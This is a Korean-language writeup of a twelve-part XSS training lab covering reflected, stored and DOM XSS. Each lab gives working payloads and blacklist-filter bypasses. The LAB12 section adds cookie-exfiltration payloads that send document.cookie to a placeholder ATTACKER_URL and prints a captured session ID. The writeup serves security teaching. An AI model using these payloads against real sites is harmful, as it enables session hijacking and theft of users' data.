---
title: "웹보안 및 모의해킹 Lab - XSS Labs Writeup"
date: 2026-03-25T18:00:00+09:00
categories:
  - Web Hacking
tags:
  - Web Security Lab
  - XSS
  - Reflected XSS
  - Stored XSS
  - DOM XSS
last_modified_at: 2026-03-25T18:00:00+09:00
published: true
---
## 문제

대상: `http://192.168.0.21:8080/vuln/xss/`

범위: `LAB1 ~ LAB12`

## 개요

HTML 소스, 브라우저 렌더링 결과, 개발자도구, 요청 파라미터 반영 방식, 클라이언트 스크립트 동작을 중심으로 XSS 랩 정리

핵심: `alert(1)` 자체보다 입력값 반영 문맥 확인
문맥에 맞는 태그, 이벤트, 속성, DOM sink 선택

특히 Reflected XSS, Stored XSS, DOM XSS가 각각 어떤 차이로 발생하는지, 그리고 블랙리스트 필터가 적용되었을 때 어떤 우회 후보를 생각할 수 있는지 함께 정리함

## XSS란?

XSS(Cross Site Scripting)는 공격자가 웹 페이지에 악성 스크립트를 삽입하고, 그 스크립트가 다른 사용자의 브라우저에서 실행되도록 만드는 취약점임

주요 영향은 다음과 같다

- 세션 탈취
- 민감정보 확인
- 웹 페이지 변조
- 사용자 권한으로 기능 오용

브라우저 콘솔에서 `document.` 를 입력하면 현재 페이지에서 접근 가능한 DOM 객체, 쿠키, 위치 정보 관련 속성 확인 가능. `document.cookie`, `document.location`, `document.body.innerHTML` 같은 객체가 자주 사용됨

## XSS 자주 쓴 요소

- `<script>`: 스크립트 직접 실행
- `<img>`: `src` 오류를 이용한 `onerror`
- `<svg>`: `onload` 우회에 자주 사용
- `<iframe>`: `onmouseover` 등 이벤트 부여 가능
- `<input>`: `autofocus`와 `onfocus` 조합에 유용
- `<button>`: `onclick` 테스트에 유용

자주 사용한 함수와 객체는 다음과 같음

- `alert`, `confirm`, `print`: 실행 여부 확인
- `document.cookie`: 쿠키 확인
- `document.domain`: 도메인 확인
- `document.location`: 페이지 이동
- `document.body.innerHTML`: 본문 HTML 확인
- `document.documentElement.innerHTML`: 전체 문서 HTML 확인

자주 사용한 이벤트는 다음과 같음

- `onerror`
- `onload`
- `onfocus`
- `onclick`
- `onmouseover`

## LAB1. Reflected XSS - Basic

### 개요

검색 파라미터가 다시 검색창의 `value` 속성에 반영되는 구조. 속성 문맥에서 따옴표를 닫고 이벤트 핸들러를 삽입하면 XSS가 발생함

### 문제 코드

실제 페이지에는 XSS 성공 여부를 감지하는 스크립트가 먼저 존재함

```html
<script>
    (function() {
        const originalAlert = window.alert;

        window.alert = function(message) {
            originalAlert(message);

            const isScriptTagXSS = document.currentScript !== null;
            const isEventHandlerXSS =
                window.event &&
                ['error', 'load', 'mouseover', 'focus'].includes(window.event.type);

            if (isScriptTagXSS || isEventHandlerXSS) {
                markLabCompleted();
            }
        };
    })();
</script>
```

이 랩에서는 `alert`가 호출되더라도, 단순 콘솔 실행이 아니라 실제 스크립트 태그 또는 이벤트 핸들러를 통해 실행되어야 정답 처리됨

검색 폼은 다음과 같음

```html
<form method="GET" class="search-form">
    <input type="text" name="search" placeholder="검색어를 입력하세요" value="">
    <button type="submit">검색</button>
</form>
```

### 삽입 지점 확인

입력값을 넣고 응답 HTML을 보면 검색어가 그대로 `value` 속성에 들어감

```html
<input type="text" name="search" placeholder="검색어를 입력하세요"
       value="" onfocus="alert(1)">
```

즉 `search` 파라미터가 attribute context에 그대로 반영됨

### 사용한 페이로드

```text
" onfocus="alert(1)
```

또는 아래처럼 이벤트 부분만 따로 확인

```text
onfocus="alert(1)"
```

### 확인한 출력

```html
<input type="text" name="search" placeholder="검색어를 입력하세요"
       value="" onfocus="alert(1)">
```

입력창에 포커스를 주면 `alert(1)`이 실행되었고, 완료 스크립트가 이를 XSS 성공으로 인식함

### 분석

- 서버가 `search` 값을 받아 응답 HTML의 `value` 속성에 다시 삽입함
- 속성값 내부에서 따옴표를 닫고 `onfocus` 속성을 추가할 수 있음
- 입력창에 포커스가 가면 `alert`가 실행됨
- 이 랩의 완료 스크립트는 `focus` 이벤트도 허용하므로 정답 처리 가능함

### 추가 페이로드 후보

```text
" autofocus onfocus=alert(1) x="
" autofocus onfocus=confirm(1) x="
" autofocus onfocus=print() x="
```

`autofocus`를 함께 쓰면 사용자의 추가 동작 없이 페이지 로드 직후 `focus`가 발생할 수 있어 더 안정적임

## LAB2. Reflected XSS - Attribute

### 개요

`id` 파라미터가 게시글 번호 표시용 `<input>`의 `value` 속성에 삽입되는 구조. LAB1과 동일하게 속성 탈출이 핵심임

### 문제 코드

```html
<input type="text"
       placeholder="번호"
       value="1"
       readonly
       style="width: 80px; padding: 4px 8px; border: 1px solid #ced4da; border-radius: 4px; font-size: 13px; background: #fff;">
```

### 삽입 지점 확인

```html
<input type="text"
       placeholder="번호"
       value="1"
       readonly
       style="width: 80px; padding: 4px 8px; border: 1px solid #ced4da; border-radius: 4px; font-size: 13px; background: #fff;" onfocus=alert(1)>
```

### 사용한 페이로드

```text
" autofocus onfocus=alert(1) x="
```

### 확인한 출력

```html
<input type="text"
       placeholder="번호"
       value="1" autofocus onfocus=alert(1) x=""
       readonly>
```

페이지 진입 직후 포커스가 이동하면서 `alert(1)` 실행 확인

### 분석

- `id` 값이 별도 인코딩 없이 `value` 속성 내부에 반영됨
- `<script>`만 부분적으로 차단되더라도, 속성 기반 XSS는 그대로 가능함
- `readonly` 입력창이라도 `autofocus`를 추가하면 `focus` 이벤트 유도가 가능함

### 추가 페이로드 후보

```text
" autofocus onfocus=confirm(1) x="
" autofocus onfocus=print() x="
" onclick=alert(1) x="
```

## LAB3. Reflected XSS - Event Filter

### 개요

왼쪽 카테고리 링크의 `category` 파라미터에서 취약점이 발생하는 랩
`script`, `onerror` 차단 상태
다른 태그와 이벤트 필요

### 문제 코드

```html
<a href="?category=%EC%A0%84%EC%B2%B4"
   class="category-link "
   data-category="전체">
    전체
</a>
```

### 삽입 지점 확인

`category` 값이 속성 문맥을 깨는 형태로 반영되며, 링크 태그 내부에 새로운 태그를 삽입할 수 있음

```text
/vuln/xss/lab3.php?category=1"><svg/onload=alert(1)>
```

### 사용한 페이로드

```html
"><svg/onload=alert(1)>
```

### 확인한 출력

```html
<a href="?category=1"><svg/onload=alert(1)></a>
```

카테고리 링크 영역에 삽입한 `svg`가 로드되면서 `alert(1)` 실행 확인

### 분석

- 이 랩은 `script`, `onerror`가 차단됨
- 따라서 가장 먼저 떠올릴 수 있는 `<script>alert(1)</script>` 또는 `<img src=x onerror=alert(1)>`는 사용 불가함
- 대신 `svg` 태그의 `onload`를 이용하면 태그가 로드될 때 스크립트 실행 가능함
- 즉 필터가 일부 문자열만 막는 블랙리스트 방식이므로 태그와 이벤트를 바꾸면 우회 가능함

### 추가 페이로드 후보

```html
"><svg/onload=confirm(1)>
"><iframe/src/onmouseover=alert(1)>
"><input autofocus onfocus=alert(1)>
```

## LAB4. Reflected XSS - Multi Filter

### 개요

`page` 파라미터가 페이지네이션 표시용 입력창에 반영되는 구조. `script`, `onerror`, `onload`, `img`, `alert`, `svg`가 차단되어 있어 우회 폭이 더 좁아짐

### 문제 코드

```html
<input type="text"
       name="page"
       value="1"
       readonly
       style="width:36px; text-align:center; padding:4px 0; border:2px solid #007bff; border-radius:4px; font-size:14px; font-weight:700; color:#007bff; background:#e8f0fe; cursor:default;">
```

### 사용한 페이로드

우회 예시는 아래와 같음

```text
/vuln/xss/lab4.php?page=2"><iframe/src/onmouseover=confirm(1)>
```

핵심 페이로드는 다음과 같음

```html
"><iframe/src/onmouseover=confirm(1)>
```

### 확인한 출력

```html
<input type="text" name="page" value="2"><iframe/src/onmouseover=confirm(1)>
```

마우스를 올리면 `confirm(1)`이 실행되었고, `alert` 차단 상태에서도 이벤트 실행 자체는 유지됨을 확인 가능

### 분석

- `svg`, `img`, `alert`, `onload`, `onerror`가 모두 차단됨
- 따라서 앞선 랩에서 쓰던 `svg/onload`, `img/onerror`는 사용할 수 없음
- `iframe` 태그는 차단 대상이 아니고 `onmouseover`도 차단 대상이 아니므로 조합 가능함
- 실행 함수도 `alert` 대신 `confirm`을 사용해야 차단을 피할 수 있음

### 추가 페이로드 후보

```html
"><iframe/src/onmouseover=print()>
"><button onclick=confirm(1)>x</button>
"><input autofocus onfocus=confirm(1)>
```

## LAB5. Reflected XSS - Hidden Input

### 개요

여러 hidden input이 있는 검색 폼에서, 실제로 어떤 파라미터가 반영되는지 찾아내는 랩. 힌트는 hidden input이지만 실제 sink는 `sort` 파라미터 쪽임

### 문제 코드

```html
<form method="GET" class="search-form">
    <input type="hidden" name="page" value="1">
    <input type="hidden" name="view" value="list">
    <input type="hidden" name="sort" value="newest">
    <input type="text" name="search" placeholder="검색어를 입력하세요" value="">
    <input type="hidden" name="lang" value="ko">
    <input type="hidden" name="display" value="list">
    <button type="submit">검색</button>
</form>
```

### 사용한 페이로드

최종 우회 예시는 다음과 같음

```text
/vuln/xss/lab5.php?sort="><svg/onload=confirm(1)>
```

핵심 페이로드:

```html
"><svg/onload=confirm(1)>
```

### 확인한 출력

```html
<input type="hidden" name="sort" value=""><svg/onload=confirm(1)>
```

`sort` 값이 hidden input 속성에서 탈출되며, 렌더링 직후 `confirm(1)` 실행 확인

### 분석

- `script`, `img`, `alert`, `prompt`가 차단됨
- hidden input이 여러 개라서 어떤 필드가 반영되는지 직접 하나씩 넣어봐야 함
- `sort` 값이 속성 문맥에 저장되는 것을 확인하면 태그 삽입이 가능함
- `alert`는 차단되므로 `confirm`으로 변경해야 함

### 추가 페이로드 후보

```html
"><svg/onload=print()>
"><input autofocus onfocus=confirm(1)>
"><iframe/src/onmouseover=confirm(1)>
```

## LAB6. Stored XSS - Basic

### 개요

게시글 작성 기능에서 `content` 필드가 저장된 뒤 상세 페이지에서 그대로 렌더링되는 구조. 저장형 XSS의 가장 기본적인 형태다

### 문제 코드

```html
<div class="form-group">
    <label>내용</label>
    <textarea name="post_content" placeholder="내용을 입력하세요."></textarea>
</div>
```

### 사용한 페이로드

```html
<input type="a" id="b" value="c" autofocus onfocus="alert(321)">
```

### 확인한 출력

```html
<div class="post-content">
  <input type="a" id="b" value="c" autofocus onfocus="alert(321)">
</div>
```

게시글 상세 진입 시 자동 포커스로 `alert(321)` 실행 확인

### 분석

- 사용자가 입력한 내용이 저장됨
- 게시글 상세 화면에서 HTML 인코딩 없이 렌더링됨
- `input` 태그와 `autofocus`, `onfocus` 조합으로 페이지 진입 시 바로 실행 유도 가능함

### 추가 페이로드 후보

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)></svg>
<button onclick=alert(1)>click</button>
<iframe src=x onmouseover=alert(1)></iframe>
```

## LAB7. Stored XSS - Script Filter

### 개요

제목 필드에서 저장형 XSS를 유도하는 랩
`script`, `svg`, `img`, `onerror`, `prompt` 제거됨

### 문제 코드

```html
<div class="form-group" style="flex:1;">
    <label>제목</label>
    <input type="text" name="post_title" placeholder="제목을 입력하세요.">
</div>
```

### 사용한 페이로드

```html
<input type="a" id="b" value="c" autofocus onfocus="alert(321)">
```

### 확인한 출력

```html
<h1 class="detail-title">
  <input type="a" id="b" value="c" autofocus onfocus="alert(321)">
</h1>
```

제목 영역에 저장된 태그가 그대로 렌더링되며, 상세 또는 목록 화면에서 실행 가능 상태 확인

### 분석

- 제목 값이 저장된 뒤 게시글 목록이나 상세 화면 제목 위치에 그대로 출력됨
- `script`, `svg`, `img`, `onerror`가 차단되므로 가장 흔한 페이로드는 실패함
- `input` 태그와 `onfocus`는 차단되지 않으므로 우회 가능함

### 추가 페이로드 후보

```html
<input autofocus onfocus=alert(1)>
<button onclick=alert(1)>x</button>
<iframe src=x onmouseover=confirm(1)></iframe>
<video><source src=x onerror=alert(1)></video>
```

`video > source onerror`는 실무에서도 한 번쯤 생각해볼 만한 우회 후보지만, 이 랩에서는 `onerror` 차단 여부를 먼저 확인해야 함

## LAB8. Stored XSS - Multi Filter

### 개요

댓글 필드에서 저장형 XSS를 유도하는 랩
`script`, `svg`, `img`, `body`, `onerror`, `onload`, `prompt` 제거됨

### 사용한 페이로드

초기 후보:

```html
<a href=javascript:alert(1)>click</a>
```

다른 후보:

```html
<input type="a" id="b" value="c" autofocus onfocus="alert(321)">
```

### 확인한 출력

```html
<div class="comment-body">
  <input type="a" id="b" value="c" autofocus onfocus="alert(321)">
</div>
```

댓글 렌더링 구간에서 태그가 인코딩되지 않고 그대로 출력됨을 확인 가능

### 분석

- `img/onerror`, `svg/onload`, `body onload` 계열은 모두 막힘
- 남는 선택지는 `javascript:` URI, `onclick`, `onfocus`, `onmouseover` 같은 비차단 이벤트임
- 댓글은 사용자가 직접 클릭하거나 포커스할 가능성이 있으므로 실행 트리거를 고려해야 함

### 추가 페이로드 후보

```html
<a href=javascript:alert(1)>click</a>
<input autofocus onfocus=alert(1)>
<button onclick=alert(1)>run</button>
<iframe src=x onmouseover=confirm(1)></iframe>
```

## LAB9. DOM XSS - URL Parameter

### 개요

검색 페이지에서 `?q=` 값이 클라이언트 스크립트에 의해 DOM에 직접 삽입됨
서버 응답이 아니라 브라우저 쪽 `innerHTML`이 핵심 sink

### 문제 코드

```javascript
var q = new URLSearchParams(location.search).get('q');
if (q === null) return;

document.getElementById('searchInput').value = q;
document.getElementById('search-section').style.display = 'block';
document.getElementById('main-section').style.display = 'none';

document.getElementById('search-query').innerHTML = q;
```

### 사용한 페이로드

```text
?q=<img src=x onerror=alert(1)>
```

### 확인한 출력

```html
<div class="sr-head">🔍 "<strong id="search-query"><img src=x onerror=alert(1)></strong>" 검색 결과</div>
```

검색 결과 헤더가 그려지는 시점에 `img` 로드 오류가 발생하며 `alert(1)` 실행 확인

### 분석

- `q` 값은 서버가 아니라 클라이언트 JavaScript가 읽음
- 그 값이 필터링 없이 `innerHTML`에 들어감
- `<script>`는 `innerHTML`로 넣어도 실행되지 않는 경우가 많지만, 이벤트 기반 태그는 실행 가능함
- 따라서 `img onerror`, `svg onload` 같은 벡터가 더 적합함

### 추가 페이로드 후보

```text
?q=<img src=x onerror=alert(1)>
?q=<svg onload=alert(1)></svg>
?q=<button onclick=alert(1)>click</button>
?q=<iframe src=x onmouseover=confirm(1)></iframe>
?q=<img src=x onerror=confirm(document.domain)>
?q=<button onclick=print()>print</button>
```

## LAB10. DOM XSS - Client Filter Bypass

### 개요

`?q=` 값이 DOM에 삽입되지만, 클라이언트 측에서 `<script`, `onerror` 문자열만 제거하는 구조. 필터가 있더라도 우회 가능한지 확인하는 랩임

### 페이지 힌트

문제 화면은 검색 포털 형태이고, 사용자는 검색창에 값을 넣어 `q` 파라미터를 만들 수 있다

```html
<form class="search-wrap" method="get" action="">
  <input type="text" name="q" id="searchInput" placeholder="CVE 번호, 보안 키워드, 위협 이름 입력..." autocomplete="off">
  <button type="submit">🔍 검색</button>
</form>
```

즉 입력값이 서버가 아니라 클라이언트 검색 결과 영역으로 다시 연결되는 구조임을 먼저 확인 가능

### 핵심 코드

실제 페이지 설명상 `q`가 DOM에 삽입되고 일부 문자열만 제거됨

```javascript
function sanitize(s) {
  return s.replace(/<script/gi, '').replace(/onerror/gi, '');
}

document.getElementById('search-query').innerHTML = sanitize(q);
```

### 사용한 페이로드

```text
?q=<svg/onload=alert(3)></svg>
```

### 확인한 출력

```html
<strong id="search-query"><svg/onload=alert(3)></svg></strong>
```

`<script`와 `onerror` 제거 후에도 `svg/onload`는 남아 실행 가능 상태 확인

### 분석

- `<script>`만 막는 경우는 이벤트 기반 태그로 쉽게 우회 가능함
- `onerror`만 막아도 `onload`, `onfocus`, `onclick`, `onmouseover`는 여전히 남아 있을 수 있음
- 이 랩에서는 `svg onload`가 가장 간단한 우회 벡터였음

### 추가 페이로드 후보

```text
?q=<svg onload=alert(1)></svg>
?q=<input autofocus onfocus=alert(1)>
?q=<iframe src=x onmouseover=confirm(1)></iframe>
?q=<button onclick=print()>click</button>
```

## LAB11. DOM XSS - Fragment / innerHTML

### 개요

URL fragment(`#...`) 값이 브라우저 JavaScript에서 `innerHTML`로 삽입되는 랩
fragment는 서버로 전송되지 않으므로 전형적인 클라이언트 기반 DOM XSS

### 페이지 힌트

이 랩은 공지사항 공유 기능처럼 보임
UI 자체가 해시 기반 공유를 유도

```html
<div class="hash-input-row">
  <span class="hash-prefix">📌 #</span>
  <input type="text" id="noticeInput" placeholder="공지할 내용을 입력하세요...">
  <button onclick="shareNotice()">📢 공유</button>
</div>
```

즉 사용자가 입력한 값이 URL의 `#fragment`로 들어가고, 그 fragment를 다시 화면에 출력하는 구조라는 점은 UI만 봐도 추론 가능

### 문제 코드

```javascript
var raw = location.hash.slice(1);
var content = decodeURIComponent(raw);
document.getElementById('notice-content').innerHTML = content;
```

### 사용한 페이로드

주소창 직접 삽입:

```text
#<img src=x onerror=alert(1)>
```

입력창을 통한 삽입:

```text
1234"><img/src/onerror=alert(1234)>
```

### 확인한 출력

```html
<div id="notice-content"><img src=x onerror=alert(1)></div>
```

또는 공유 기능 사용 시 fragment 값이 그대로 들어간 공지 영역에서 동일한 실행 확인

### 분석

- `location.hash`는 서버를 거치지 않음
- fragment 값이 디코딩된 뒤 그대로 `innerHTML`에 들어감
- 따라서 URL만 만들어 전달해도 사용자의 브라우저에서 바로 실행 가능함

### 추가 페이로드 후보

```text
#<img src=x onerror=alert(1)>
#<svg onload=alert(1)></svg>
#<button onclick=alert(1)>click</button>
#<iframe src=x onmouseover=confirm(1)></iframe>
#<img src=x onerror=confirm(document.cookie)>
```

## LAB12. XSS Advanced

### 개요

게시글 본문과 댓글에 필터가 없고, 관리자 봇이 주기적으로 방문하는 구조. 단순 실행 확인을 넘어서, 다른 사용자의 세션 또는 페이지 데이터를 외부로 전송하는 흐름까지 실습하는 랩임

### 문제 코드

```html
<ul>
    <li>게시판 서비스입니다. 게시글 본문 및 <strong>댓글(comment)</strong> 필드에서 Stored XSS를 발생시키세요.</li>
    <li>모든 입력 필드(게시글 제목/내용/작성자, 댓글 내용/작성자)에 <strong>필터링이 없습니다.</strong></li>
    <li>다양한 XSS 벡터를 활용한 고도화 페이로드를 실습해보세요.</li>
    <li>최종 목표: user2 계정의 세션 값을 찾아 제출하세요.</li>
</ul>
```

입력 폼은 일반 게시글 작성 UI이며, 본문 필드가 그대로 저장되는 구조

```html
<form method="POST" action="?">
    <input type="text" name="post_author" value="admin">
    <input type="text" name="post_title" placeholder="제목을 입력하세요.">
    <textarea name="post_content" placeholder="내용을 입력하세요."></textarea>
</form>
```

### 핵심 포인트

- 제목, 본문, 댓글, 작성자 필드 모두 입력 가능
- 서버 측 필터링이 없음
- 관리자 봇이 게시물을 열람함
- 사용자가 직접 클릭하지 않아도 자동 실행되는 페이로드가 유리함

### 실제 사용한 흐름

최종 단계는 `document.cookie`를 외부 수집 지점으로 전송해 세션 값을 확인하는 방식

```html
<script>location.href="ATTACKER_URL/?q="+document.cookie</script>
```

획득한 세션 값:

```text
d246af00e9361f6ee3a3e62d6a9ab0ff
```

### 확인한 출력

외부 수집 지점에서는 아래와 같은 형태로 요청이 도착함

```text
GET /?q=PHPSESSID=d246af00e9361f6ee3a3e62d6a9ab0ff
```

즉 관리자 봇이 게시글을 열람하는 시점에 저장형 XSS가 실행되고, 쿠키가 외부로 전달됨을 확인 가능

### 추가 시도한 페이로드 정리

페이지 내용을 다시 로컬 URL로 보내는 형태:

```html
<script>location.href="/?q="+btoa(encodeURIComponent(document.body.innerHTML))</script>
```

페이지 이동 없이 전송하는 형태:

```html
<img src=x onerror=navigator.sendBeacon("ATTACKER_URL",document.cookie)>
```

```html
<script>fetch("ATTACKER_URL",{method:"POST",mode:"no-cors",body:document.cookie})</script>
```

### 다양한 페이로드 후보

단순 실행 확인:

```html
<script>alert(1)</script>
<svg onload=alert(1)></svg>
<img src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<button onclick=alert(1)>click</button>
```

쿠키, 위치, 도메인 확인:

```html
<script>confirm(document.cookie)</script>
<script>prompt(document.domain)</script>
<script>console.log(document.location)</script>
<img src=x onerror=confirm(document.cookie)>
```

페이지 데이터 확인:

```html
<script>confirm(document.body.innerHTML)</script>
<script>alert(document.documentElement.innerHTML)</script>
<script>location.href="/?q="+btoa(encodeURIComponent(document.body.innerHTML))</script>
```

외부 전송 방식 후보:

```html
<script>location.href="ATTACKER_URL/?q="+document.cookie</script>
<script>location.href=`ATTACKER_URL/?q=${document.cookie}`</script>
<img src=x onerror=navigator.sendBeacon("ATTACKER_URL",document.cookie)>
<script>fetch("ATTACKER_URL",{method:"POST",mode:"no-cors",body:document.cookie})</script>
```

### 분석

- 필터가 없으므로 `<script>` 기반 페이로드가 바로 동작할 가능성이 높음
- 관리자 봇이 자동으로 방문하므로 `onclick`보다는 `script`, `onload`, `onerror`, `autofocus onfocus` 계열이 더 적합함
- 페이지 이동이 발생하는 `location.href`는 가장 단순하지만 흔적이 뚜렷함
- `sendBeacon`, `fetch`는 페이지 이동 없이 데이터를 전송할 수 있어 대체 벡터로 생각해볼 수 있음

### 정리

이 랩은 단순히 XSS가 발생하는지만 보는 단계가 아니라,

- 어떤 필드에 주입할지
- 자동 실행이 가능한지
- 어떤 브라우저 객체를 읽을지
- 데이터를 어떤 방식으로 보낼지

까지 함께 고려해야 하는 랩이었음

## 전체 정리

이번 XSS 랩은 네 가지 흐름으로 구분 가능

- Reflected XSS: LAB1 ~ LAB5
- Stored XSS: LAB6 ~ LAB8
- DOM XSS: LAB9 ~ LAB11
- Advanced XSS: LAB12

실습하면서 공통적으로 확인한 포인트는 다음과 같음

- 사용자 입력이 어느 문맥에 반영되는지 먼저 확인해야 함
- `<script>`가 막히더라도 이벤트 핸들러 기반 우회가 가능할 수 있음
- `innerHTML`은 DOM XSS의 대표 sink임
- `javascript:` URI, `onfocus`, `onmouseover`, `onload` 같은 대체 벡터를 항상 같이 생각해야 함
- Stored XSS는 다른 사용자 또는 관리자 봇이 열람할 때 영향이 커짐

결국 XSS는 단순히 `alert(1)`을 띄우는 문제가 아니라, 입력값이 HTML, attribute, DOM, script 중 어디에 삽입되는지 파악하고 그 문맥에 맞는 실행 벡터를 선택하는 문제가 핵심임



